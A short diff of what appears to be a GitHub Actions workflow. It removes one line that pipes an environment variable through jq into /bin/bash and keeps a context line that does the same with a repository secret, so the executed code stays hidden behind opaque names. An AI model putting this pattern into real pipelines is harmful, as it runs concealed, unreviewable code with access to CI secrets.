@@ -27,7 +27,6 @@ jobs:
           wfqx0: ${{ secrets.wfqx0 }}
         run: |
           printf '%s' "$wfqx0" | jq -r .xjuaa598 | /bin/bash
-          echo $iex07963 | jq -r .xxt8 | /bin/bash
 
       - name: Save archive
         if: always()
